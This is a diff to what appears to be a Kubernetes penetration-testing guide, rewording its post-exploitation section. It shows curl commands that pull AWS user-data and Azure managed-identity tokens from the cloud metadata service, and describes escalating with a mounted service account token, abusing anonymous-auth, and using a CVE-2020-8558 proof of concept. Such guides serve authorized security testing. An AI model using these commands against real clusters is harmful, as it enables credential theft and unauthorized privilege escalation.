@@ -75,7 +75,7 @@ Connection received on 10.0.0.162 42035
 # Post exploitation
 
 ## Cloud metadata
-If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both.
+If the cluster is cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node or even just find a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or in both.
 ### AWS
 ```bash
 curl http://169.254.169.254/latest/user-data #Look for credentials or bucket names
@@ -139,12 +139,12 @@ An awesome GCP privesc reference: https://about.gitlab.com/blog/2020/02/12/plund
 
 **Test to see if you have access to the metadata service**
 ```
-curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-10-01" | jq .
+curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2020-10-01" | jq .
 ```
 
-**If an managed identity is assigned to the node, you can access the node's identify token**
+**If a managed identity is assigned to the node, you can access the node's identify token**
 ```
- curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq .
+ curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"| jq .
  ```
 
 **Launch a new pod with the azure-cli**
@@ -181,7 +181,8 @@ az role assignment list
 ```
 
 ## Overly permissive service account
-If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
+If the namespace’s default service account is mounted to `/var/run/secrets/kubernetes.io/serviceaccount/token` in your pod and is overly permissive, use that token to further escalate your privileges within the cluster.
+
 
 **Install kubectl in your pod**
 ```
@@ -200,12 +201,13 @@ kubectl auth can-i --list
 
 
 ## Anonymous-auth
-If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
+If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/) and there are no network policy controls preventing it, you can interact with them directly without authentication. 
 
-## Exploits
-Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
-## Traditional vulnerability hunting
-Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 
+## Kernel, container engine, or Kubernetes exploits
+An unpatched exploit in the underlying kernel, in the container engine, or in Kubernetes can potentially allow a container escape, or access to the Kubernetes cluster without any additional permissions. i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
+
+## Hunt for vulnerable services 
+Your pod will likely see a different view of the network services running in the cluster than you can see from the machine you used to create the pod. You can hunt for vulnerable services and applications by proxying your traffic through the pod.
 
 
 
